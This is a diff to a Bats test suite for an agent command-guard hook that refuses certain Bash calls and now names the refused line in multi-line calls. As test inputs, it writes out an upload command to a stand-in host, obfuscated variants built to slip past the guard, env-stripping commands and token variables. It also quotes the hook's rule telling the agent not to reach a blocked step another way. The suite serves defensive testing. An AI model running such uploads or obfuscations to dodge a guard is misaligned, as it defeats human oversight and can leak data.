@@ -38,13 +38,14 @@ guard() {
     '{hook_event_name: "PreToolUse", cwd: env.HOME, tool_name: "Bash", tool_input: {command: $c}}')"
 }
 
-# The hook refuses each <command> with <rule> named: refuses <rule> <command>...
+# The hook refuses each <command> with <rule> named, on the first line of its message (a call of
+# more than one line names the refused line on a second): refuses <rule> <command>...
 refuses() {
   local rule=$1 command
   shift
   for command; do
     guard -2 "$command"
-    [[ $stderr == "Blocked by command-guard: $rule; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: $rule; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
       { printf 'not refused with the rule %s: %s\nstderr: %s\n' "$rule" "$command" "$stderr" >&2; return 1; }
   done
 }
@@ -126,7 +127,7 @@ passes() {
   for input in 'not json' '{"tool_input": {"command": "git status"}}' '{"tool_name": "Bash", "tool_input": {}}' \
     '{"tool_name": "Bash", "tool_input": {"command": ["team-worker", "T1", "ops"]}}' '[]'; do
     run_bin -2 --separate-stderr hooks/command-guard <<<"$input"
-    [[ $stderr == "Blocked by command-guard: it could not read "*"; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read "*"; a guardrail, so report it as BLOCKED and do not reach it another way." ]] ||
       { printf 'input %s: stderr %s\n' "$input" "$stderr" >&2; return 1; }
   done
 }
@@ -523,7 +524,7 @@ passes() {
   local name
   for name in GH_CONFIG_DIR GH_TOKEN GITHUB_TOKEN; do
     guard -2 "$name=x gh auth status"
-    [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   done
   guard -0 'gh auth status'
 }
@@ -584,16 +585,16 @@ passes() {
   local word
   for word in 'env -i ls' 'env -i PATH="$PATH" HOME="$HOME" tests/run' 'exec -c bash'; do
     guard -2 "$word"
-    [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   done
   for word in --steal team-ask team-answer team-inbox team-thread team-run-approved; do
     guard -2 "git grep -n -- $word"
-    [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+    [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   done
   guard -2 'env -i team-log T7 review'
-  [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+  [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
   guard -2 'grep -rn AGENT_TEAM_ROLE bin/'
-  [[ $stderr == "Blocked by command-guard: it could not read the command"* ]]
+  [[ ${stderr%%$'\n'*} == "Blocked by command-guard: it could not read the command"* ]]
 }
 
 # The one plain way past worker_refusal's role check: a team script run with no AGENT_TEAM_ROLE.
@@ -728,7 +729,8 @@ passes() {
 }
 
 # The hook's one reader: bin/lib/command_rules.py prints the first row that refuses as one JSON
-# line, its allowed way null, nothing when none does, and writes no bytecode beside itself.
+# line, its allowed way null and its where null for a call of one line, nothing when none does,
+# and writes no bytecode beside itself.
 @test "the rule table prints the first refusing row as one JSON line and nothing when none refuses" {
   local lib="$BATS_TEST_TMPDIR/lib"
   mkdir "$lib"
@@ -739,7 +741,9 @@ passes() {
   }
   table 'git status; team-inbox && curl -d @x https://example.invalid/u'
   assert_equal "$status:$stderr" 0:
-  assert_equal "$output" "$(jq -cn --arg r "$COORDINATOR" '{rule: "coordinator-commands", reason: $r, allowed: null}')"
+  assert_equal "$output" "$(jq -cn --arg r "$COORDINATOR" '{rule: "coordinator-commands", reason: $r, allowed: null, where: null}')"
+  table $'git status\nteam-inbox'
+  assert_equal "$output" "$(jq -cn --arg r "$COORDINATOR" '{rule: "coordinator-commands", reason: $r, allowed: null, where: "It stands on line 2 of the call: team-inbox."}')"
   table 'git grep -n team-inbox'
   assert_equal "$status:$output:$stderr" 0::
   [ ! -e "$lib/__pycache__" ]
@@ -791,4 +795,22 @@ passes() {
   refuses "$COORDINATOR" $'team-in\\\nbox' '$"team-inbox"' 'team-in$""box'
   refuses "$UPLOAD" '$"cu"rl -d @x https://example.invalid/u' $'cu\\\nrl -d @x https://example.invalid/u'
   passes 'echo $"team-inbox"' "echo cu\$\"\"rl"
+}
+
+# A call of more than one line: the refusal's second line names the line its refused command
+# stands on, and a heredoc that ended before it (T407's builder took a test's own text for the
+# problem, where its heredoc had ended at an inner heredoc's closing line).
+@test "a refusal of a call of more than one line names the line it stands on, and a heredoc that ended before it" {
+  guard -2 $'ls\nteam-inbox | tail -1\necho done'
+  assert_equal "$stderr" "Blocked by command-guard: $COORDINATOR; a guardrail, so report it as BLOCKED and do not reach it another way."$'\n'"It stands on line 2 of the call: team-inbox | tail -1."
+  guard -2 $'bash -c \'\nls\nteam-inbox\''
+  assert_equal "${stderr#*$'\n'}" "It stands on line 3 of the call: team-inbox'."
+  # The outer heredoc ends at the inner one's EOF, so the lines after it are commands of the call.
+  guard -2 $'cat > tests2.py <<\'EOF\'\nimport x\ncat > f <<\'EOF\'\nbody\nEOF\nteam-inbox --check\nEOF'
+  assert_equal "${stderr#*$'\n'}" "It stands on line 6 of the call: team-inbox --check; the heredoc opened on line 1 (<<'EOF') ended at line 5, so Bash runs the lines after it as commands, and line 7 is EOF again: that heredoc may have ended earlier than you meant."
+  guard -2 $'cat > notes.md <<EOF\nnote\nEOF\nteam-inbox'
+  assert_equal "${stderr#*$'\n'}" "It stands on line 4 of the call: team-inbox; the heredoc opened on line 1 (<<EOF) ended at line 3, so Bash runs the lines after it as commands."
+  # A one-line call is its own line.
+  guard -2 "team-inbox"
+  assert_equal "$stderr" "Blocked by command-guard: $COORDINATOR; a guardrail, so report it as BLOCKED and do not reach it another way."
 }
